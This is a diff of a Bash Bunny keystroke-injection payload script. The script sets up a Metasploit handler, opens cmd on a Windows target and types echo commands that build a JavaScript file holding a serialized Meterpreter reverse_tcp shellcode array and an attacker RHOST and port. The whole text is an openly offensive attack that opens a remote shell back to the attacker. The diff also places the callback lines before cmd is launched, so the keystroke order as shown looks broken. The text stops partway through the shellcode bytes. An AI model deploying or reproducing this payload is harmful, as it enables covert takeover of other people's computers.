@@ -1,18 +1,33 @@
 REM Shellcode from Cn33liz/JSMeter
 REM Ported by: SubINaclS
-REM Change IPADDR and PORT to match your system
-REM Listener should be set to windows/x64/meterpreter/reverse_tcp
+REM setup listener as follows:
+REM use exploit/multi/handler
+REM  !!!! set PAYLOAD windows/x64/meterpreter/reverse_tcp <- When run from x64 version of cscript.exe
+REM  !!!! set PAYLOAD windows/meterpreter/reverse_tcp <- When run from x86 version of cscript.exe
+REM set LHOST 0.0.0.0 <- When run from x86 version of cscript.exe
+REM set LPORT 443
+REM set EnableUnicodeEncoding true
+REM set EnableStageEncoding true
+REM set ExitOnSession false
+REM exploit -j 
+REM Start exploit, going green
 LED G
-ATTACKMODE HID
-DUCKY_LANG us
-Q GUI r
-Q DELAY 1000
-Q STRING "cmd"
-Q ENTER
+REM Change IPADDR and PORT to match your system
 Q STRING "echo var RHOST = 'IPADDRESSHERE' > BB-Metasploit-Winx64.js"
 Q ENTER
 Q STRING "echo var RPORT = '5555'; >> BB-Metasploit-Winx64.js"
 Q ENTER
+REM set attackmode to HID device
+ATTACKMODE HID
+REM set keyboard
+DUCKY_LANG us
+REM open run menu
+Q GUI r
+Q DELAY 1000
+REM launch command shell, obvious for testing
+Q STRING "cmd"
+Q ENTER
+REM create malicious JS file locally on system
 Q STRING "echo var serialized_obj = [ >> BB-Metasploit-Winx64.js"
 Q ENTER
 Q STRING "echo 0,1,0,0,0,255,255,255,255,1,0,0,0,0,0,0,0,4,1,0,0,0,34,83,121,115,116,101,109,46,68,101,108, >> BB-Metasploit-Winx64.js"
